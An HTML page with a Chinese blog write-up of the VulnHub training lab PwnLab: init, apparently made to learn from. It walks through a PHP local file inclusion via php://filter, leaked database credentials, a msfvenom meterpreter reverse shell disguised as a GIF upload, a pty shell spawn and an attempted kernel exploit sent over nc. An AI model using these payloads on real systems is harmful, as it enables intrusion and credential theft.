<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pwnlab：LFI 本地文件包含＋上传</title>
    <style type="text/css" media="all">
      body {
        margin: 0;
        font-family: "Helvetica Neue", Helvetica, Arial, "Hiragino Sans GB", sans-serif;
        font-size: 14px;
        line-height: 20px;
        color: #777;
        background-color: white;
      }
      .container {
        width: 700px;
        margin-right: auto;
        margin-left: auto;
      }

      .post {
        font-family: Georgia, "Times New Roman", Times, "SimSun", serif;
        position: relative;
        padding: 70px;
        bottom: 0;
        overflow-y: auto;
        font-size: 16px;
        font-weight: normal;
        line-height: 25px;
        color: #515151;
      }

      .post h1{
        font-size: 50px;
        font-weight: 500;
        line-height: 60px;
        margin-bottom: 40px;
        color: inherit;
      }

      .post p {
        margin: 0 0 35px 0;
      }

      .post img {
        border: 1px solid #D9D9D9;
      }

      .post a {
        color: #28A1C5;
      }
    </style>
  </head>
  <body>
    <div class="container">
      <div class="post">
        <h1 class="title">Pwnlab：LFI 本地文件包含＋上传</h1>
        <div class="show-content">
          <p><a href="https://www.vulnhub.com/entry/pwnlab-init,158/" target="_blank">靶机下载</a>，<a href="https://www.vulnhub.com/entry/pwnlab-init,158/" target="_blank">PwnLab: init</a></p><p>192.168.1.112</p><blockquote>
<p>80/tcp   open  http    Apache httpd 2.4.10 (<b>(Debian)</b>)</p>
<p>111/tcp  open  rpcbind 2-4 (RPC #100000)</p>
<p>3306/tcp open  mysql   MySQL 5.5.47-0+deb8u1</p>
<p>OS details: Linux 3.2 - 4.8</p>
</blockquote><p>web上有个登陆页面，有上传功能，不过要登陆后才能使用。</p><p>用paros扫描web网页，发现Directory browsing目录遍历，路径是http://192.168.1.112/images/</p><hr><p>查看源代码192.168.1.112/index.php，有一行：</p><div class="image-package">
<img class="uploaded-img" src="http://upload-images.jianshu.io/upload_images/2883590-0ac9f46f0a8e55e0.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" width="auto" height="auto"><br><div class="image-caption"></div>
</div><p>尝试../../../../../../etc/passwd，看是否能泄露密码文件？</p><p>http://192.168.1.112/?page=../../../../../../../../etc/passwd%00.asp，尝试截断，无效。</p><div class="image-package">
<img class="uploaded-img" src="http://upload-images.jianshu.io/upload_images/2883590-52564b99d6148f3f.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" width="auto" height="auto"><br><div class="image-caption">http://xxx.com?parameter=1.html说明可能有文件包含漏洞</div>
</div><p>然而并没有任何反应。看来LFI过滤了，编码绕过，无效</p><p>url编码 ：  %2e%2e%2f   解码：../</p><p>utf-8编码：..%c0%af  解码：../</p><p>看write-up</p><blockquote><p>http://192.168.1.112/?page=php://filter/convert.base64-encode/resource=config</p></blockquote><p>php封装协议：<a href="http://php.net/manual/zh/wrappers.php.php" target="_blank">php://</a></p><p><a href="https://diablohorn.com/2010/01/16/interesting-local-file-inclusion-method/" target="_blank">有趣的文件包含方式</a>：所以说，通过php://filter，这个东西是被设计，用来过滤数据流的。</p><p>resource=&lt;xx&gt;这个参数是必须指定的，是待过滤的文件</p><p>read=&lt;xx&gt; 可选参数，用来设置过滤器，等等参数。</p><p>于是我们通过使用该php的特性，指定了一个文件（文件包含），泄露了信息。就好比，我们到古董店，假装大买家，然后说”你们把所有值钱的古董都拿出来看看。“ 结果看完古董调戏一通，你就走了。（并没有使用过滤功能，而只是查看xx文件而已）</p><div class="image-package">
<img class="uploaded-img" src="http://upload-images.jianshu.io/upload_images/2883590-bd88e5fbf1950684.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" width="auto" height="auto"><br><div class="image-caption">hackbar-encoding功能base64解码</div>
</div><div class="image-package">
<img class="uploaded-img" src="http://upload-images.jianshu.io/upload_images/2883590-232e13b9fa74313b.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" width="auto" height="auto"><br><div class="image-caption"></div>
</div><p>解码config文件以后，得到用户名和密码。。但是，如何知道config文件里面有用户名和密码，这是个谜。。</p><blockquote><p>mysql -uroot -pH4u%QJ_H99 -h 192.168.1.112</p></blockquote><p><a href="https://www.jianshu.com/p/77fa1245427a" target="_blank">使用mysql</a>：登陆mysql服务器，获得Users里的用户名和密码</p><div class="image-package">
<img class="uploaded-img" src="http://upload-images.jianshu.io/upload_images/2883590-755edde512c46dc3.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" width="auto" height="auto"><br><div class="image-caption"></div>
</div><p>看看mysql能不能执行命令。。不能</p><div class="image-package">
<img class="uploaded-img" src="http://upload-images.jianshu.io/upload_images/2883590-e386c6acbc009076.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" width="auto" height="auto"><br><div class="image-caption"></div>
</div><p>登陆web上传页面。尝试上传图片，反弹shell</p><blockquote><p>http://192.168.1.112/?page=php://filter/convert.base64-encode/resource=upload</p></blockquote><p>故技重施，我们得到upload.php的源代码。</p><div class="image-package">
<img class="uploaded-img" src="http://upload-images.jianshu.io/upload_images/2883590-dc6b462b54ab2881.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" width="auto" height="auto"><br><div class="image-caption"></div>
</div><p>源代码里清清楚楚地写着，如果文件后缀不是图片格式，就会出错。</p><p>msfvenom -p php/meterpreter/reverse_tcp LHOST="192.168.1.107攻击机ip" LPORT=7766 -o xxd.gif</p><p>尝试真的图片，可以上传，但是webshell试来试去就不能上传。。</p><p>吐血，vi xxd.gif</p><p>然后在开头加一行 GIF98，就可以成功上传了，，</p><div class="image-package">
<img class="uploaded-img" src="http://upload-images.jianshu.io/upload_images/2883590-102450d64d5e199d.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" width="auto" height="auto"><br><div class="image-caption"></div>
</div><p>http://192.168.1.112/upload/b5e9b4f86ce43ca65bd79c894c4a924c.gif        图片地址</p><p>先用metasploit-multi handler，监听。然后直接访问上面的地址，结果网页显示，不能显示图片，因为有错误，，</p><div class="image-package">
<img class="uploaded-img" src="http://upload-images.jianshu.io/upload_images/2883590-85a81a8b322dfd3c.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" width="auto" height="auto"><br><div class="image-caption"></div>
</div><p>http://192.168.1.112/?page=php://filter/convert.base64-encode/resource=upload/b5e9b4f86ce43ca65bd79c894c4a924c.gif </p><p>那么这样呢，虽然网页没有显示任何错误，但是监听本地端口并没有任何连接进来。。</p><p>因为在一开始的时候，我们查看过index.php的源代码，然后我们分析下index.php</p><p>http://192.168.1.112/?page=php://filter/convert.base64-encode/resource=index，解码后再分析。。</p><div class="image-package">
<img class="uploaded-img" src="http://upload-images.jianshu.io/upload_images/2883590-b20acc8951fc33ba.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" width="auto" height="auto"><br><div class="image-caption"></div>
</div><p>没想到里面暗藏乾坤啊，include()函数，又包含了一个lang/</p><p>先用burp，拦截到上传页面，然后将Cookie: PHPSESSID=58eb3vo1suaoh1iv8nkh21gho7，改成如图所示</p><div class="image-package">
<img class="uploaded-img" src="http://upload-images.jianshu.io/upload_images/2883590-34f63b52952ca46d.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" width="auto" height="auto"><br><div class="image-caption"></div>
</div><p>然后点，go执行请求，于是用文件包含成功运行webshell。</p><p>运行的命令：</p><p>shell</p><p>id</p><p>python -c 'import pty;pty.spawn("/bin/bash")'</p><p>cat /etc/passwd</p><p>获得信息：四个普通用户，以及root用户（通过分析passwd文件第三项大于500可知）</p><blockquote>
<p>john:x:1000:1000:,,,:/home/john:/bin/bash</p>
<p><b>kent:x:1001:1001:,,,:/home/kent:/bin/bash</b></p>
<p><b>mike:x:1002:1002:,,,:/home/mike:/bin/bash</b></p>
<p><b>kane:x:1003:1003:,,,:/home/kane:/bin/bash</b></p>
</blockquote><p>其中有三个我们知道用户名和密码，于是尝试登陆 kent/JWzXuBJJNy ，ok得到普通用户权限。</p><hr><p>uname -a</p><p>Linux pwnlab 3.16.0-4-686-pae #1 SMP Debian 3.16.7-ckt20-1+deb8u4 (2016-02-29) i686 GNU/Linux</p><p>尝试内核漏洞提权：nc -lvp 666 &lt; /root/Desktop/40847.cpp</p><p>nc 192.168.1.107 666 &gt; xx.cpp</p><blockquote>
<p>kent@pwnlab:~$ file xx.cpp</p>
<p>file xx.cpp</p>
<p>xx.cpp: C++ source, ASCII text, with CRLF line terminators</p>
<p>kent@pwnlab:~$ gcc xx.cpp</p>
<p>gcc xx.cpp</p>
<p><b>gcc: error trying to exec 'cc1plus': execvp: No such file or directory</b></p>
</blockquote><p>发生了一个错误，找的网上答案说，gcc是c编译器，g++是c++编译器，所以用g++编译，然后靶机上并没有g++编译器。。失败</p><p><a href="http://www.abatchy.com/2016/11/pwnlab-init-walkthrough-vulnhub.html" target="_blank">writeup贴上</a>：后面提权方式看不懂了，好像用到了pwn——二进制分析的知识。。</p><p>向各位提供writeup的大佬低头。。</p><p>总结：</p><p>本次学习了上传+文件包含拿webshell的方法。</p><p>linux base64解码的命令</p><p>echo “(base encoded text past here without braket)” | base64 -d</p>
        </div>
      </div>
    </div>
  </body>
</html>
